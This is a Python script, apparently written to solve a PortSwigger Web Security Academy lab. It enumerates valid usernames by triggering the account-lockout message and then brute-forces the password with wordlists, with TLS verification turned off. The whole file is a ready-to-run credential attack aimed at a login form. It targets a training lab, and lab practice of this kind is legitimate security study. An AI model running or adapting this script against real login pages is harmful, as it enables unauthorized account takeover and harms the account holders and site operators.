import sys
import urllib, urllib3
from urllib import response
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

usernames = open('usernames.txt').read().splitlines()
passwords = open('passwords.txt').read().splitlines()
url = 'https://0a3c009a044d92dec0a84fe900270058.web-security-academy.net/login'

def enumerate_usr(url):
    for usr in usernames:
        print('[+] Sending POST request as', usr)
        for i in range(0,5):
            dat = {'username': usr, 'password': 'passwordxdd'}
            resp = requests.post(url, data=dat, verify=False)
            if 'too many incorrect login attempts' in resp.text:
                print('Found! --> ' + usr)
                return usr

def get_password(url, username):
    for pas in passwords:
        print('[+] Trying password:', pas)
        dat = {'username': username, 'password': pas}
        resp = requests.post(url, data=dat, verify=False)
        if 'Invalid username' not in resp.text and 'You have made too many incorrect login attempts' not in resp.text:
            print('Found Password -->', pas)
            return pas

username = enumerate_usr(url)
password = get_password(url, username)
print('[+] Username:', username, '- Password:', password)